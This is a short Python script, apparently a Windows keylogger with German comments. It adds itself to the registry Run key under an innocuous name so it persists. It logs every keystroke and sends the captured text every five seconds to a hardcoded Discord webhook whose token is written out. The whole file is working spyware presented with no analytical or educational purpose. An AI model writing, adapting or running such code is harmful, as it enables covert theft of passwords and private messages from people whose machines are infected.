import os
import sys
import time
import winreg
from pynput import keyboard
import threading
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1379909569710526605/BmrWeTzOiR5KIVll_f8qHjvHv78O0EWAhF8JD8Q6s2BdeqaO6HDthVF4ZJ5EYXy0bpjZ"  # DEINE URL HIER SICHER HALTEN

key_buffer = []
send_interval = 5  # alle 5 Sekunden senden

def add_to_startup():
    try:
        file_path = os.path.realpath(sys.argv[0])
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "MeinTool", 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(key)
    except:
        pass

def send_to_discord(content):
    data = {"content": content}
    try:
        requests.post(WEBHOOK_URL, json=data)
    except:
        pass

def flush_buffer():
    global key_buffer
    while True:
        if key_buffer:
            content = ''.join(key_buffer)
            send_to_discord(f"Tasten: {content}")
            key_buffer = []
        time.sleep(send_interval)

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            key_buffer.append(key.char)
        else:
            key_buffer.append(f"[{key}]")
    except:
        pass

def main():
    add_to_startup()
    thread = threading.Thread(target=flush_buffer, daemon=True)
    thread.start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
